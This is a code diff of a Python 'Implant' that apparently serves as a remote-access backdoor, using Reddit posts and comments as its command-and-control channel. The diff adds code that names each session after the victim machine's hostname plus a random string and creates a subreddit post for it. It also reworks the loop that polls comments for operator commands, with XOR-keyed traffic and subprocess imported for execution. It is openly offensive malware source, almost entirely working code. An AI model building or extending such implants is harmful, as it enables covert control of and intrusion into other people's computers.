@@ -2,6 +2,8 @@ import praw
 import time
 import subprocess
 import base64
+import random
+import string
 
 #Function to convert base64 to file
 def base64_to_file(base64_string, filename):
@@ -83,6 +85,12 @@ class Implant:
                 )
             self.__reddit.validate_on_submit = True
         return self.__reddit
+               
+    #post into the subreddit
+    def createPost(self):
+        postContent = "" #add sth here if you don't want to leave the post body empty
+        self.subreddit.submit(self.listener_name, selftext=postContent)
+        print("[+] Created a session with ID: " + self.listener_name)
     
     @property
     def subreddit(self):
@@ -101,14 +109,17 @@ class Implant:
         victim_responses = []
 
         while not victim_responses:
-            #look only for comments which has our command in it
             self.verifySession()
-            self.submission.comments.replace_more(limit=None)
-            for top_level_comment in self.submission.comments:
-                if("in:" in top_level_comment.body and top_level_comment.id not in self.processed_comments):
-                    self.comment_id = top_level_comment.id
-                    self.processed_comments.append(top_level_comment.id)
-                    victim_responses.append(top_level_comment.body)
+            #look only for comments which has our command in it
+            if(self.submission == ""):
+                print("[+] Waiting for commands")
+            else:    
+                self.submission.comments.replace_more(limit=None)
+                for top_level_comment in self.submission.comments:
+                    if("in:" in top_level_comment.body and top_level_comment.id not in self.processed_comments):
+                        self.comment_id = top_level_comment.id
+                        self.processed_comments.append(top_level_comment.id)
+                        victim_responses.append(top_level_comment.body)
             
         response = victim_responses[0]
         response = response[6:-1]
@@ -151,17 +162,18 @@ if __name__ == "__main__":
     username = "myusername"
     password = "mypassword"
     subreddit = "mysubreddit"
-    listener_name = "listener_name"
     xor_key = "myxorkey"
     #-------------------------------------
     user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
 
-    i = Implant(client_id, client_secret, username, password, subreddit, listener_name, user_agent, xor_key)
-    listener_session = i.verifySession()
-    if listener_session:
-        print("[+] Entered the session")
-    else:
-        print("[!] Listener session not found")
+    #create a random agent session ID
+    listener_session = subprocess.getoutput('hostname')
+    result_str = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
+    listener_session += '_' + result_str
+
+    i = Implant(client_id, client_secret, username, password, subreddit, listener_session, user_agent, xor_key)
+    i.createPost()
+    time.sleep(5)
 
     while True:
         time.sleep(5)
